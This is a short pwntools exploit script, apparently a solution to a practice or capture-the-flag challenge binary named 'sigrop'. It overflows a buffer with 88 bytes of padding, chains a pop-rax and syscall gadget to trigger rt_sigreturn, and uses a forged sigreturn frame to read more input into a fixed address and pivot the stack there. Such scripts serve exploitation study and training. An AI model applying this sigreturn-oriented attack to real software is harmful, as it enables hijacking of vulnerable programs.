#!/bin/python
from pwn import *
exe = ELF('./sigrop')

p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*main+62
           ''')

pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
#################exploiting#####################
context.clear(arch='amd64')
frame = SigreturnFrame()
frame.rax = 0x0
frame.rdi = 0
frame.rsi = 0x0000000000406270
frame.rdx = 0x200
frame.rsp =  0x0000000000406270
frame.rip = syscall
payload = b'A'*88
payload += flat(pop_rax,0xf,syscall)
payload += bytes(frame)
p.sendlineafter(b'something: ',payload)
##############the end###########################
p.interactive()
